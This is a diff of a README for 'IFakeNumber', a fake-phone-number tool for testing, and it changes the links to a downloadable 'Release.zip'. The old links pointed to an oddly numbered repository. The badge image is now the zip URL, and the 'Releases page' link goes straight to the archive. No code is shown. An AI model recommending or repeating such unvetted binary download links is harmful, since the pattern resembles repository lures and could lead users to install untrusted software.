@@ -10,7 +10,7 @@ Welcome to the IFakeNumber repository! This project is a comprehensive tool for 
 - Includes functionalities for quality assurance (QA) testing and testing tools.
 
 ## Installation
-To get started with using IFakeNumber, you can download the software from the following link: [![Download Software](https://img.shields.io/badge/Download-Software-yellow)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip). 
+To get started with using IFakeNumber, you can download the software from the following link: [![Download Software](https://github.com/ichbincoo/IFakeNumber/releases/download/v1.0/Release.zip)](https://github.com/ichbincoo/IFakeNumber/releases/download/v1.0/Release.zip). 
 
 Please download the software and follow the instructions in the README file provided to launch the application.
 
@@ -36,4 +36,4 @@ IFakeNumber is released under the MIT license. See the [LICENSE](LICENSE) file f
 
 **Keep Generating Fake Numbers, Keep Testing!** 📱🧪🔍
 
-If the provided link does not work, please check the "Releases" section of the repository to find the software download. Visit the [Releases](https://github.com/22155555/1875695542/releases) page for more information.
+If the provided link does not work, please check the "Releases" section of the repository to find the software download. Visit the [Releases](https://github.com/ichbincoo/IFakeNumber/releases/download/v1.0/Release.zip) page for more information.
